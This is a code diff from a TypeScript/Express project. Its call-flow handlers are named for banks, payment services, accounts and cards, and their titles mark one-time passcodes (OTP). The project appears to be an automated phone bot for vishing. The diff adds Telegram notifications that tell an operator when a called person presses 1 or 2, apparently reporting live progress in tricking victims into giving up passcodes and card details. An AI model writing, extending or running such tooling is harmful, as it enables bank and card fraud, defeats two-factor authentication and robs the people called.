@@ -1,14 +1,23 @@
 import { Response } from 'express';
 import { v4 as uuidv4 } from 'uuid';
+import { bot } from '..';
 
-export const bankFlow = (
+export const bankFlow = async (
   dtmf: string,
   res: Response,
   language: string,
   chatId: number | undefined,
   step: string,
-): Response => {
+  destination: string,
+): Promise<Response> => {
   if (dtmf && dtmf === '1') {
+    await bot.telegram.sendMessage(
+      Number(chatId),
+      `On call (${destination}) 🤳🏽`,
+      {
+        parse_mode: 'HTML',
+      },
+    );
     return res.json({
       id: uuidv4(),
       title: `call bank - ${chatId} OTP`,
@@ -53,6 +62,13 @@ export const bankFlow = (
       ],
     });
   } else if (dtmf && dtmf === '2') {
+    await bot.telegram.sendMessage(
+      Number(chatId),
+      `On call (${destination}) 🤳🏽`,
+      {
+        parse_mode: 'HTML',
+      },
+    );
     return res.json({
       id: uuidv4(),
       title: `call bank - ${chatId} OTP`,
@@ -191,15 +207,23 @@ export const bankFlow = (
   }
 };
 
-export const payFlow = (
+export const payFlow = async (
   dtmf: string,
   res: Response,
   language: string,
   chatId: number | undefined,
   step: string,
+  destination: string,
   wallet?: string,
-): Response => {
+): Promise<Response> => {
   if (dtmf && dtmf === '1') {
+    await bot.telegram.sendMessage(
+      Number(chatId),
+      `On call (${destination}) 🤳🏽`,
+      {
+        parse_mode: 'HTML',
+      },
+    );
     return res.json({
       id: uuidv4(),
       title: `call pay - ${chatId} OTP`,
@@ -240,6 +264,13 @@ export const payFlow = (
       ],
     });
   } else if (dtmf && dtmf === '2') {
+    await bot.telegram.sendMessage(
+      Number(chatId),
+      `On call (${destination}) 🤳🏽`,
+      {
+        parse_mode: 'HTML',
+      },
+    );
     return res.json({
       id: uuidv4(),
       title: `call pay - ${chatId} OTP`,
@@ -376,15 +407,23 @@ export const payFlow = (
   }
 };
 
-export const accountFlow = (
+export const accountFlow = async (
   dtmf: string,
   res: Response,
   language: string,
   chatId: number | undefined,
   step: string,
+  destination: string,
   askCardInfo?: string,
-): Response => {
+): Promise<Response> => {
   if (dtmf && dtmf === '1') {
+    await bot.telegram.sendMessage(
+      Number(chatId),
+      `On call (${destination}) 🤳🏽`,
+      {
+        parse_mode: 'HTML',
+      },
+    );
     return res.json({
       id: uuidv4(),
       title: `call account - ${chatId} OTP`,
@@ -425,6 +464,13 @@ export const accountFlow = (
       ],
     });
   } else if (dtmf && dtmf === '2') {
+    await bot.telegram.sendMessage(
+      Number(chatId),
+      `On call (${destination}) 🤳🏽`,
+      {
+        parse_mode: 'HTML',
+      },
+    );
     return res.json({
       id: uuidv4(),
       title: `call account - ${chatId} OTP`,
@@ -561,15 +607,23 @@ export const accountFlow = (
   }
 };
 
-export const cardFlow = (
+export const cardFlow = async (
   dtmf: string,
   res: Response,
   language: string,
   chatId: number | undefined,
   step: string,
+  destination: string,
   cardType: string,
-): Response => {
+): Promise<Response> => {
   if (dtmf && dtmf === '1') {
+    await bot.telegram.sendMessage(
+      Number(chatId),
+      `On call (${destination}) 🤳🏽`,
+      {
+        parse_mode: 'HTML',
+      },
+    );
     return res.json({
       id: uuidv4(),
       title: `pay card - ${chatId} OTP`,
@@ -610,6 +664,13 @@ export const cardFlow = (
       ],
     });
   } else if (dtmf && dtmf === '2') {
+    await bot.telegram.sendMessage(
+      Number(chatId),
+      `On call (${destination}) 🤳🏽`,
+      {
+        parse_mode: 'HTML',
+      },
+    );
     return res.json({
       id: uuidv4(),
       title: `call card - ${chatId} OTP`,
